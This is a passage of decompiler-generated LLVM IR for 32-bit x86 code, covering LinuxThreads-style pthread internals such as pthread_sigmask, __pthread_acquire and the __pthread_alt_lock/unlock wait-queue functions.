  store i32 %v1_804c804, i32* %stack_var_-28, align 4
  %v4_804c810 = call i32 @pthread_kill(i32 %v1_804c804, i32 %arg1, i32 %v0_804c809, i32 %v0_804c809)
  %v1_804c81c = icmp eq i32 %v4_804c810, 0
  br i1 %v1_804c81c, label %dec_label_pc_804c82a, label %dec_label_pc_804c820

dec_label_pc_804c820:                             ; preds = %entry
  %v0_804c820 = load i32, i32* %stack_var_-28, align 4
  %v1_804c820 = call i32 @__errno_location(i32 %v0_804c820)
  %v2_804c825 = inttoptr i32 %v1_804c820 to i32*
  store i32 %v4_804c810, i32* %v2_804c825, align 4
  br label %dec_label_pc_804c82a

dec_label_pc_804c82a:                             ; preds = %entry, %dec_label_pc_804c820
  %v0_804c82d = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_804c820 ]
  %v2_804c82c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c82c, i32* @ebx, align 4
  ret i32 %v0_804c82d

; uselistorder directives
  uselistorder i32 %v1_804c804, { 1, 0 }
  uselistorder label %dec_label_pc_804c82a, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804c844 = icmp eq i32 %arg2, 0
  br i1 %v1_804c844, label %entry.dec_label_pc_804c8b6_crit_edge, label %dec_label_pc_804c848

entry.dec_label_pc_804c8b6_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804c8b6

dec_label_pc_804c848:                             ; preds = %entry
  %v2_804c848 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_804c848, i32* @ebx, align 4
  store i32 %v2_804c848, i32* %stack_var_-156, align 4
  %v3_804c854 = bitcast i32* %stack_var_-136 to i16*
  %v4_804c854 = call i32 @memcpy(i16* %v3_804c854, i32 %arg2, i32 128)
  %v5_804c85c = icmp eq i32 %arg1, 0
  %v9_804c85c = icmp eq i32 %arg1, 1
  br i1 %v9_804c85c, label %dec_label_pc_804c89d, label %dec_label_pc_804c861

dec_label_pc_804c861:                             ; preds = %dec_label_pc_804c848
  %v9_804c861 = icmp eq i32 %arg1, 2
  br i1 %v9_804c861, label %dec_label_pc_804c86c, label %dec_label_pc_804c866

dec_label_pc_804c866:                             ; preds = %dec_label_pc_804c861
  br i1 %v5_804c85c, label %dec_label_pc_804c87e, label %dec_label_pc_804c8b2

dec_label_pc_804c86c:                             ; preds = %dec_label_pc_804c861
  %v0_804c86e = load i32, i32* @global_var_80626e8.171, align 8
  store i32 %v2_804c848, i32* %stack_var_-156, align 4
  %v2_804c875 = call i32 @__GI_sigaddset(i32 %v2_804c848, i32 %v0_804c86e)
  br label %dec_label_pc_804c880

dec_label_pc_804c87e:                             ; preds = %dec_label_pc_804c866
  br label %dec_label_pc_804c880

dec_label_pc_804c880:                             ; preds = %dec_label_pc_804c86c, %dec_label_pc_804c87e
  store i32 %v2_804c848, i32* %stack_var_-156, align 4
  %v1_804c887 = call i32 @__GI_sigdelset(i32 %v2_804c848)
  %v0_804c88c = load i32, i32* @global_var_80626f0.146, align 16
  %tmp20 = icmp slt i32 %v0_804c88c, 1
  br i1 %tmp20, label %dec_label_pc_804c8b2, label %dec_label_pc_804c898

dec_label_pc_804c898:                             ; preds = %dec_label_pc_804c880
  br label %dec_label_pc_804c8a5

dec_label_pc_804c89d:                             ; preds = %dec_label_pc_804c848
  br label %dec_label_pc_804c8a5

dec_label_pc_804c8a5:                             ; preds = %dec_label_pc_804c898, %dec_label_pc_804c89d
  store i32 %v2_804c848, i32* %stack_var_-156, align 4
  %v1_804c8a6 = call i32 @__GI_sigdelset(i32 %v2_804c848)
  br label %dec_label_pc_804c8b6

dec_label_pc_804c8b2:                             ; preds = %dec_label_pc_804c866, %dec_label_pc_804c880
  br label %dec_label_pc_804c8b6

dec_label_pc_804c8b6:                             ; preds = %entry.dec_label_pc_804c8b6_crit_edge, %dec_label_pc_804c8a5, %dec_label_pc_804c8b2
  %v0_804c8be = phi i32 [ 0, %entry.dec_label_pc_804c8b6_crit_edge ], [ %v2_804c848, %dec_label_pc_804c8a5 ], [ %v2_804c848, %dec_label_pc_804c8b2 ]
  store i32 %arg1, i32* %stack_var_-156, align 4
  %v3_804c8c0 = inttoptr i32 %v0_804c8be to %_TYPEDEF_sigset_t*
  %v4_804c8c0 = call i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v3_804c8c0, i32 %arg3)
  %v8_804c8ca = icmp eq i32 %v4_804c8c0, -1
  %v1_804c8cb = icmp eq i1 %v8_804c8ca, false
  br i1 %v1_804c8cb, label %dec_label_pc_804c8d4, label %dec_label_pc_804c8cd

dec_label_pc_804c8cd:                             ; preds = %dec_label_pc_804c8b6
  %v0_804c8cd = load i32, i32* %stack_var_-156, align 4
  %v1_804c8cd = call i32 @__errno_location(i32 %v0_804c8cd)
  %v1_804c8d2 = inttoptr i32 %v1_804c8cd to i32*
  %v2_804c8d2 = load i32, i32* %v1_804c8d2, align 4
  br label %dec_label_pc_804c8d4

dec_label_pc_804c8d4:                             ; preds = %dec_label_pc_804c8b6, %dec_label_pc_804c8cd
  %v0_804c8da = phi i32 [ 0, %dec_label_pc_804c8b6 ], [ %v2_804c8d2, %dec_label_pc_804c8cd ]
  ret i32 %v0_804c8da

; uselistorder directives
  uselistorder i32 %v2_804c848, { 0, 1, 7, 6, 3, 2, 5, 4, 8, 9 }
  uselistorder i32 %arg1, { 3, 2, 0, 1, 4, 5 }
  uselistorder label %dec_label_pc_804c8d4, { 1, 0 }
  uselistorder label %dec_label_pc_804c8b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c8b2, { 1, 0 }
  uselistorder label %dec_label_pc_804c8a5, { 1, 0 }
  uselistorder label %dec_label_pc_804c880, { 1, 0 }
}

define i32 @wait_node_dequeue() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c8e4 = load i32, i32* @edx, align 4
  %v1_804c8e4 = load i32, i32* @eax, align 4
  %v12_804c8e4 = icmp eq i32 %v0_804c8e4, %v1_804c8e4
  %v1_804c8e6 = icmp eq i1 %v12_804c8e4, false
  %v0_804c901.pre = load i32, i32* @ecx, align 4
  br i1 %v1_804c8e6, label %dec_label_pc_804c901, label %dec_label_pc_804c8e8

dec_label_pc_804c8e8:                             ; preds = %entry
  %v1_804c8e8 = inttoptr i32 %v0_804c901.pre to i32*
  %v2_804c8e8 = load i32, i32* %v1_804c8e8, align 4
  store i32 %v2_804c8e8, i32* %ebx.global-to-local, align 4
  %v1_804c8ec = inttoptr i32 %v0_804c8e4 to i32*
  %v2_804c8ec = load i32, i32* %v1_804c8ec, align 4
  %v15_804c8ec = icmp eq i32 %v0_804c901.pre, %v2_804c8ec
  %v22_804c8ec = select i1 %v15_804c8ec, i32 %v2_804c8e8, i32 %v2_804c8ec
  store i32 %v22_804c8ec, i32* %v1_804c8ec, align 4
  %v1_804c8f0 = zext i1 %v15_804c8ec to i32
  %v2_804c8f0 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c8f0 = and i32 %v2_804c8f0, -256
  %v4_804c8f0 = or i32 %v3_804c8f0, %v1_804c8f0
  store i32 %v4_804c8f0, i32* %ebx.global-to-local, align 4
  %v4_804c8f3 = icmp eq i1 %v15_804c8ec, false
  br i1 %v4_804c8f3, label %dec_label_pc_804c8fb.preheader, label %dec_label_pc_804c905

dec_label_pc_804c8fb.preheader:                   ; preds = %dec_label_pc_804c8e8
  %v0_804c8fb.pre = load i32, i32* @edx, align 4
  %v0_804c8fd.pre = load i32, i32* @ecx, align 4
  %v1_804c8fb7 = inttoptr i32 %v0_804c8fb.pre to i32*
  %v2_804c8fb8 = load i32, i32* %v1_804c8fb7, align 4
  %v12_804c8fd10 = icmp eq i32 %v0_804c8fd.pre, %v2_804c8fb8
  %v1_804c8ff11 = icmp eq i1 %v12_804c8fd10, false
  br i1 %v1_804c8ff11, label %dec_label_pc_804c8f9, label %dec_label_pc_804c901.loopexit

dec_label_pc_804c8f9:                             ; preds = %dec_label_pc_804c8fb.preheader, %dec_label_pc_804c8f9
  %v2_804c8fb12 = phi i32 [ %v2_804c8fb, %dec_label_pc_804c8f9 ], [ %v2_804c8fb8, %dec_label_pc_804c8fb.preheader ]
  store i32 %v2_804c8fb12, i32* @edx, align 4
  %v1_804c8fb = inttoptr i32 %v2_804c8fb12 to i32*
  %v2_804c8fb = load i32, i32* %v1_804c8fb, align 4
  %v12_804c8fd = icmp eq i32 %v0_804c8fd.pre, %v2_804c8fb
  %v1_804c8ff = icmp eq i1 %v12_804c8fd, false
  br i1 %v1_804c8ff, label %dec_label_pc_804c8f9, label %dec_label_pc_804c901.loopexit

dec_label_pc_804c901.loopexit:                    ; preds = %dec_label_pc_804c8f9, %dec_label_pc_804c8fb.preheader
  %v0_804c8fb.lcssa = phi i32 [ %v0_804c8fb.pre, %dec_label_pc_804c8fb.preheader ], [ %v2_804c8fb12, %dec_label_pc_804c8f9 ]
  br label %dec_label_pc_804c901

dec_label_pc_804c901:                             ; preds = %entry, %dec_label_pc_804c901.loopexit
  %v1_804c903 = phi i32 [ %v0_804c8fb.lcssa, %dec_label_pc_804c901.loopexit ], [ %v0_804c8e4, %entry ]
  %v0_804c901 = phi i32 [ %v0_804c8fd.pre, %dec_label_pc_804c901.loopexit ], [ %v0_804c901.pre, %entry ]
  %v1_804c901 = inttoptr i32 %v0_804c901 to i32*
  %v2_804c901 = load i32, i32* %v1_804c901, align 4
  %v2_804c903 = inttoptr i32 %v1_804c903 to i32*
  store i32 %v2_804c901, i32* %v2_804c903, align 4
  br label %dec_label_pc_804c905

dec_label_pc_804c905:                             ; preds = %dec_label_pc_804c8e8, %dec_label_pc_804c901
  %v2_804c905 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_804c905

; uselistorder directives
  uselistorder i32 %v2_804c8fb8, { 1, 0 }
  uselistorder i32 %v0_804c8fd.pre, { 2, 1, 0 }
  uselistorder i1 %v15_804c8ec, { 1, 2, 0 }
  uselistorder i32 %v2_804c8ec, { 1, 0 }
  uselistorder i32 %v0_804c901.pre, { 1, 0, 2 }
  uselistorder i32 %v0_804c8e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c905, { 1, 0 }
  uselistorder label %dec_label_pc_804c901, { 1, 0 }
  uselistorder label %dec_label_pc_804c8f9, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_804c908 = load i32, i32* @esi, align 4
  %v0_804c909 = load i32, i32* @ebx, align 4
  %v0_804c90d = load i32, i32* @eax, align 4
  store i32 %v0_804c90d, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_804c936 = ptrtoint i32* %stack_var_-16 to i32
  %v1_804c94811 = inttoptr i32 %v0_804c90d to i32*
  %v2_804c94812 = load i32, i32* %v1_804c94811, align 4
  store i32 1, i32* %v1_804c94811, align 4
  %v1_804c94a13 = icmp eq i32 %v2_804c94812, 0
  %v1_804c94c14 = icmp eq i1 %v1_804c94a13, false
  br i1 %v1_804c94c14, label %dec_label_pc_804c913, label %dec_label_pc_804c94e

dec_label_pc_804c913:                             ; preds = %entry, %dec_label_pc_804c943.backedge
  %v0_804c913 = load i32, i32* @esi, align 4
  %v1_804c913 = add i32 %v0_804c913, -49
  %v6_804c913 = sub i32 48, %v0_804c913
  %v7_804c913 = and i32 %v6_804c913, %v0_804c913
  %v8_804c913 = icmp slt i32 %v7_804c913, 0
  %v9_804c913 = icmp eq i32 %v1_804c913, 0
  %v10_804c913 = icmp slt i32 %v1_804c913, 0
  %v3_804c916 = icmp eq i1 %v10_804c913, %v8_804c913
  %v4_804c916 = icmp eq i1 %v9_804c913, false
  %v5_804c916 = and i1 %v4_804c916, %v3_804c916
  br i1 %v5_804c916, label %dec_label_pc_804c920, label %dec_label_pc_804c918

dec_label_pc_804c918:                             ; preds = %dec_label_pc_804c913
  %v1_804c918 = call i32 @sched_yield(i32 %v0_804c909)
  %v0_804c91d = load i32, i32* @esi, align 4
  %v1_804c91d = add i32 %v0_804c91d, 1
  store i32 %v1_804c91d, i32* @esi, align 4
  br label %dec_label_pc_804c943.backedge

dec_label_pc_804c920:                             ; preds = %dec_label_pc_804c913
  store i32 0, i32* %stack_var_-16, align 4
  %v0_804c930 = load i32, i32* @edx, align 4
  store i32 0, i32* @esi, align 4
  %v4_804c93b = call i32 @nanosleep(i32 %v2_804c936, i32 0, i32 %v0_804c930, i32 %v0_804c930)
  br label %dec_label_pc_804c943.backedge

dec_label_pc_804c943.backedge:                    ; preds = %dec_label_pc_804c920, %dec_label_pc_804c918
  %v0_804c948.pre = load i32, i32* @ebx, align 4
  %v1_804c948 = inttoptr i32 %v0_804c948.pre to i32*
  %v2_804c948 = load i32, i32* %v1_804c948, align 4
  store i32 1, i32* %v1_804c948, align 4
  %v1_804c94a = icmp eq i32 %v2_804c948, 0
  %v1_804c94c = icmp eq i1 %v1_804c94a, false
  br i1 %v1_804c94c, label %dec_label_pc_804c913, label %dec_label_pc_804c94e

dec_label_pc_804c94e:                             ; preds = %dec_label_pc_804c943.backedge, %entry
  %v2_804c948.lcssa = phi i32 [ %v2_804c94812, %entry ], [ %v2_804c948, %dec_label_pc_804c943.backedge ]
  store i32 %v0_804c909, i32* @ebx, align 4
  store i32 %v0_804c908, i32* @esi, align 4
  ret i32 %v2_804c948.lcssa

; uselistorder directives
  uselistorder i32 %v1_804c913, { 1, 0 }
  uselistorder label %dec_label_pc_804c913, { 1, 0 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %v0_804c954 = load i32, i32* @ebx, align 4
  %v0_804c955 = load i32, i32* @eax, align 4
  store i32 %v0_804c955, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8062fe8.173 to i32), i32* @eax, align 4
  %v1_804c95f = call i32 @__pthread_acquire(i32 %v0_804c954)
  %v0_804c964 = load i32, i32* @global_var_8062fe4.174, align 4
  %v1_804c969 = load i32, i32* @ebx, align 4
  %v2_804c969 = inttoptr i32 %v1_804c969 to i32*
  store i32 %v0_804c964, i32* %v2_804c969, align 4
  %v0_804c96b = load i32, i32* @ebx, align 4
  store i32 %v0_804c96b, i32* @global_var_8062fe4.174, align 4
  store i32 0, i32* @global_var_8062fe8.173, align 8
  ret i32 %v0_804c964
}

define i32 @restart.3() local_unnamed_addr {
entry:
  %v0_804c982 = load i32, i32* @eax, align 4
  %v1_804c983 = call i32 @__pthread_restart_new(i32 %v0_804c982)
  ret i32 %v1_804c983
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c98c = load i32, i32* @ebp, align 4
  %v0_804c98d = load i32, i32* @edi, align 4
  %v0_804c98e = load i32, i32* @esi, align 4
  %v0_804c98f = load i32, i32* @ebx, align 4
  store i32 %v0_804c98f, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* @esi, align 4
  br label %dec_label_pc_804c997

dec_label_pc_804c997:                             ; preds = %dec_label_pc_804c997.backedge, %entry
  %v24_804c9a2 = phi i32 [ %v0_804c997.pre, %dec_label_pc_804c997.backedge ], [ %tmp10, %entry ]
  %v1_804c997 = inttoptr i32 %v24_804c9a2 to i32*
  %v2_804c997 = load i32, i32* %v1_804c997, align 4
  store i32 %v2_804c997, i32* %edx.global-to-local, align 4
  %tmp50 = or i32 %v2_804c997, 1
  %tmp51 = icmp eq i32 %tmp50, 1
  br i1 %tmp51, label %dec_label_pc_804c99e, label %dec_label_pc_804c9b2

dec_label_pc_804c99e:                             ; preds = %dec_label_pc_804c997
  store i32 0, i32* @ecx, align 4
  %v2_804c9a2 = load i32, i32* %v1_804c997, align 4
  %v15_804c9a2 = icmp eq i32 %v2_804c997, %v2_804c9a2
  %v22_804c9a2 = select i1 %v15_804c9a2, i32 0, i32 %v2_804c9a2
  store i32 %v22_804c9a2, i32* %v1_804c997, align 4
  %v1_804c9a6 = zext i1 %v15_804c9a2 to i32
  %v2_804c9a6 = load i32, i32* %edx.global-to-local, align 4
  %v3_804c9a6 = and i32 %v2_804c9a6, -256
  %v4_804c9a6 = or i32 %v3_804c9a6, %v1_804c9a6
  store i32 %v4_804c9a6, i32* %edx.global-to-local, align 4
  %v4_804c9a9 = icmp eq i1 %v15_804c9a2, false
  br i1 %v4_804c9a9, label %dec_label_pc_804c997.backedge, label %dec_label_pc_804ca32.loopexit

dec_label_pc_804c997.backedge:                    ; preds = %dec_label_pc_804c99e, %dec_label_pc_804ca04, %dec_label_pc_804ca0e
  %v0_804c997.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c997

dec_label_pc_804c9b2:                             ; preds = %dec_label_pc_804c997
  %v9_804c999 = icmp eq i32 %v2_804c997, 1
  store i32 %v2_804c997, i32* @ebx, align 4
  store i32 %v24_804c9a2, i32* @ebp, align 4
  store i32 %v2_804c997, i32* @edi, align 4
  store i32 %v24_804c9a2, i32* %stack_var_-28, align 4
  %v1_804ca022638 = icmp eq i1 %v9_804c999, false
  br i1 %v1_804ca022638, label %dec_label_pc_804c9c5.lr.ph, label %dec_label_pc_804ca04

dec_label_pc_804c9c5:                             ; preds = %dec_label_pc_804c9c5.lr.ph, %dec_label_pc_804c9cb
  %v0_804c9fb29 = phi i32 [ %v0_804c9ff341, %dec_label_pc_804c9c5.lr.ph ], [ %v2_804c9dd, %dec_label_pc_804c9cb ]
  %v0_804c9f428 = phi i32 [ %v0_804c9cd540, %dec_label_pc_804c9c5.lr.ph ], [ %v0_804c9dd, %dec_label_pc_804c9cb ]
  %v0_804c9cf27 = phi i32 [ %v0_804c9cf639, %dec_label_pc_804c9c5.lr.ph ], [ %v1_804c9e0, %dec_label_pc_804c9cb ]
  %v1_804c9c5 = add i32 %v0_804c9fb29, 8
  %v2_804c9c5 = inttoptr i32 %v1_804c9c5 to i32*
  %v3_804c9c5 = load i32, i32* %v2_804c9c5, align 4
  %v4_804c9c5 = icmp eq i32 %v3_804c9c5, 0
  br i1 %v4_804c9c5, label %dec_label_pc_804c9e6, label %dec_label_pc_804c9cb

dec_label_pc_804c9cb:                             ; preds = %dec_label_pc_804c9c5
  store i32 %v0_804c9fb29, i32* @ecx, align 4
  store i32 %v0_804c9f428, i32* @edx, align 4
  store i32 %v0_804c9cf27, i32* @eax, align 4
  %v0_804c9d1 = call i32 @wait_node_dequeue()
  %v0_804c9d6 = load i32, i32* @ebx, align 4
  store i32 %v0_804c9d6, i32* @eax, align 4
  %v0_804c9d8 = call i32 @wait_node_free()
  %v0_804c9dd = load i32, i32* @ebp, align 4
  %v1_804c9dd = inttoptr i32 %v0_804c9dd to i32*
  %v2_804c9dd = load i32, i32* %v1_804c9dd, align 4
  store i32 %v2_804c9dd, i32* @ebx, align 4
  %v1_804c9e0 = load i32, i32* @esi, align 4
  %v9_804c9ff = icmp eq i32 %v2_804c9dd, 1
  %v1_804ca02 = icmp eq i1 %v9_804c9ff, false
  br i1 %v1_804ca02, label %dec_label_pc_804c9c5, label %dec_label_pc_804ca04

dec_label_pc_804c9e6:                             ; preds = %dec_label_pc_804c9c5
  %v1_804c9e6 = add i32 %v0_804c9fb29, 4
  %v2_804c9e6 = inttoptr i32 %v1_804c9e6 to i32*
  %v3_804c9e6 = load i32, i32* %v2_804c9e6, align 4
  %v1_804c9e9 = add i32 %v3_804c9e6, 24
  %v2_804c9e9 = inttoptr i32 %v1_804c9e9 to i32*
  %v3_804c9e9 = load i32, i32* %v2_804c9e9, align 4
  %v5_804c9f0 = icmp slt i32 %v3_804c9e9, %stack_var_-24.1.ph42
  br i1 %v5_804c9f0, label %dec_label_pc_804c9fb, label %dec_label_pc_804c9f2

dec_label_pc_804c9f2:                             ; preds = %dec_label_pc_804c9e6
  store i32 %v0_804c9fb29, i32* @edi, align 4
  store i32 %v0_804c9f428, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804c9fb

dec_label_pc_804c9fb:                             ; preds = %dec_label_pc_804c9e6, %dec_label_pc_804c9f2
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1.ph42, %dec_label_pc_804c9e6 ], [ %v3_804c9e9, %dec_label_pc_804c9f2 ]
  store i32 %v0_804c9fb29, i32* @ebp, align 4
  %v1_804c9fd = inttoptr i32 %v0_804c9fb29 to i32*
  %v2_804c9fd = load i32, i32* %v1_804c9fd, align 4
  store i32 %v2_804c9fd, i32* @ebx, align 4
  %v9_804c9ff25 = icmp eq i32 %v2_804c9fd, 1
  %v1_804ca0226 = icmp eq i1 %v9_804c9ff25, false
  br i1 %v1_804ca0226, label %dec_label_pc_804c9c5.lr.ph, label %dec_label_pc_804ca04

dec_label_pc_804c9c5.lr.ph:                       ; preds = %dec_label_pc_804c9b2, %dec_label_pc_804c9fb
  %stack_var_-24.1.ph42 = phi i32 [ %stack_var_-24.0, %dec_label_pc_804c9fb ], [ -2147483648, %dec_label_pc_804c9b2 ]
  %v0_804c9ff341 = phi i32 [ %v2_804c9fd, %dec_label_pc_804c9fb ], [ %v2_804c997, %dec_label_pc_804c9b2 ]
  %v0_804c9cd540 = phi i32 [ %v0_804c9fb29, %dec_label_pc_804c9fb ], [ %v24_804c9a2, %dec_label_pc_804c9b2 ]
  %v0_804c9cf639 = phi i32 [ %v0_804c9cf27, %dec_label_pc_804c9fb ], [ %v24_804c9a2, %dec_label_pc_804c9b2 ]
  br label %dec_label_pc_804c9c5

dec_label_pc_804ca04:                             ; preds = %dec_label_pc_804c9cb, %dec_label_pc_804c9b2, %dec_label_pc_804c9fb
  %stack_var_-24.1.ph.lcssa = phi i32 [ -2147483648, %dec_label_pc_804c9b2 ], [ %stack_var_-24.0, %dec_label_pc_804c9fb ], [ %stack_var_-24.1.ph42, %dec_label_pc_804c9cb ]
  %v0_804c9fb.lcssa = phi i32 [ %v2_804c997, %dec_label_pc_804c9b2 ], [ %v2_804c9fd, %dec_label_pc_804c9fb ], [ %v2_804c9dd, %dec_label_pc_804c9cb ]
  %v8_804ca04 = icmp eq i32 %stack_var_-24.1.ph.lcssa, -2147483648
  br i1 %v8_804ca04, label %dec_label_pc_804c997.backedge, label %dec_label_pc_804ca0e

dec_label_pc_804ca0e:                             ; preds = %dec_label_pc_804ca04
  %v0_804ca10 = load i32, i32* @edi, align 4
  %v1_804ca10 = add i32 %v0_804ca10, 8
  %v2_804ca10 = inttoptr i32 %v1_804ca10 to i32*
  %v3_804ca10 = load i32, i32* %v2_804ca10, align 4
  store i32 %v0_804c9fb.lcssa, i32* %v2_804ca10, align 4
  %v1_804ca13 = icmp eq i32 %v3_804ca10, 0
  %v1_804ca15 = icmp eq i1 %v1_804ca13, false
  br i1 %v1_804ca15, label %dec_label_pc_804c997.backedge, label %dec_label_pc_804ca17

dec_label_pc_804ca17:                             ; preds = %dec_label_pc_804ca0e
  %v0_804ca17 = load i32, i32* @esi, align 4
  store i32 %v0_804ca17, i32* @eax, align 4
  %v0_804ca19 = load i32, i32* @edi, align 4
  store i32 %v0_804ca19, i32* @ecx, align 4
  %v2_804ca1b = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_804ca1b, i32* @edx, align 4
  %v0_804ca1e = call i32 @wait_node_dequeue()
  %v0_804ca23 = load i32, i32* @edi, align 4
  %v1_804ca23 = add i32 %v0_804ca23, 4
  %v2_804ca23 = inttoptr i32 %v1_804ca23 to i32*
  %v3_804ca23 = load i32, i32* %v2_804ca23, align 4
  store i32 %v3_804ca23, i32* @eax, align 4
  %v2_804ca29 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ca29, i32* @ebx, align 4
  %v0_804ca2d = call i32 @restart.3()
  br label %dec_label_pc_804ca32

dec_label_pc_804ca32.loopexit:                    ; preds = %dec_label_pc_804c99e
  br label %dec_label_pc_804ca32

dec_label_pc_804ca32:                             ; preds = %dec_label_pc_804ca32.loopexit, %dec_label_pc_804ca17
  %v0_804ca39 = phi i32 [ %v2_804c997, %dec_label_pc_804ca32.loopexit ], [ %v0_804ca2d, %dec_label_pc_804ca17 ]
  store i32 %v0_804c98e, i32* @esi, align 4
  store i32 %v0_804c98d, i32* @edi, align 4
  store i32 %v0_804c98c, i32* @ebp, align 4
  ret i32 %v0_804ca39

; uselistorder directives
  uselistorder i32 %stack_var_-24.1.ph42, { 0, 2, 1 }
  uselistorder i32 %v2_804c9dd, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804c9dd, { 1, 0 }
  uselistorder i32 %v0_804c9fb29, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i1 %v15_804c9a2, { 1, 2, 0 }
  uselistorder i32 %v2_804c9a2, { 1, 0 }
  uselistorder i32 %v2_804c997, { 2, 0, 1, 7, 6, 4, 5, 3, 8 }
  uselistorder i32 %v24_804c9a2, { 0, 1, 3, 2, 4 }
  uselistorder i32 ()* @wait_node_dequeue, { 1, 0 }
  uselistorder label %dec_label_pc_804ca04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c9c5.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804c9fb, { 1, 0 }
  uselistorder label %dec_label_pc_804c997.backedge, { 2, 1, 0 }
}

define i32 @thread_self.4() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804ca41 = load i32, i32* @esp, align 4
  %v1_804ca41 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804ca41 = icmp ult i32 %v0_804ca41, %v1_804ca41
  %v1_804ca47 = icmp eq i1 %v7_804ca41, false
  br i1 %v1_804ca47, label %dec_label_pc_804ca78, label %dec_label_pc_804ca49

dec_label_pc_804ca49:                             ; preds = %entry
  %v1_804ca49 = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804ca49 = icmp ult i32 %v0_804ca41, %v1_804ca49
  br i1 %v7_804ca49, label %dec_label_pc_804ca5e, label %dec_label_pc_804ca51

dec_label_pc_804ca51:                             ; preds = %dec_label_pc_804ca49
  %v1_804ca56 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804ca56 = icmp ult i32 %v0_804ca41, %v1_804ca56
  br i1 %v7_804ca56, label %dec_label_pc_804ca78, label %dec_label_pc_804ca5e

dec_label_pc_804ca5e:                             ; preds = %dec_label_pc_804ca51, %dec_label_pc_804ca49
  %v0_804ca5e = load i32, i32* @global_var_8067650.138, align 16
  %v1_804ca5e = icmp eq i32 %v0_804ca5e, 0
  br i1 %v1_804ca5e, label %dec_label_pc_804ca6c, label %dec_label_pc_804ca67

dec_label_pc_804ca67:                             ; preds = %dec_label_pc_804ca5e
  %v0_804ca67 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804ca6c

dec_label_pc_804ca6c:                             ; preds = %dec_label_pc_804ca5e, %dec_label_pc_804ca67
  %v2_804ca72 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804ca78

dec_label_pc_804ca78:                             ; preds = %dec_label_pc_804ca51, %entry, %dec_label_pc_804ca6c
  %v0_804ca78 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804ca51 ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804ca72, %dec_label_pc_804ca6c ]
  ret i32 %v0_804ca78

; uselistorder directives
  uselistorder label %dec_label_pc_804ca78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ca6c, { 1, 0 }
}

define i32 @suspend.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804ca7c = load i32, i32* @eax, align 4
  %v1_804ca7d = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804ca7c)
  ret i32 %v1_804ca7d
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ca86 = load i32, i32* @esi, align 4
  %v0_804ca87 = load i32, i32* @ebx, align 4
  store i32 %v0_804ca87, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804caad = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_804ca93

dec_label_pc_804ca93:                             ; preds = %dec_label_pc_804cab1.dec_label_pc_804ca93_crit_edge, %entry
  %v0_804ca93 = phi i32 [ %v0_804ca93.pre, %dec_label_pc_804cab1.dec_label_pc_804ca93_crit_edge ], [ %tmp9, %entry ]
  %v1_804ca93 = inttoptr i32 %v0_804ca93 to i32*
  %v2_804ca93 = load i32, i32* %v1_804ca93, align 4
  store i32 %v2_804ca93, i32* @ebx, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v1_804ca9a = icmp eq i32 %v2_804ca93, 0
  br i1 %v1_804ca9a, label %dec_label_pc_804cab1, label %dec_label_pc_804ca9e

dec_label_pc_804ca9e:                             ; preds = %dec_label_pc_804ca93
  %v0_804ca9e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca9e = icmp eq i32 %v0_804ca9e, 0
  %v1_804caa0 = icmp eq i1 %v1_804ca9e, false
  br i1 %v1_804caa0, label %dec_label_pc_804caa9, label %dec_label_pc_804caa2

dec_label_pc_804caa2:                             ; preds = %dec_label_pc_804ca9e
  %v0_804caa2 = call i32 @thread_self.4()
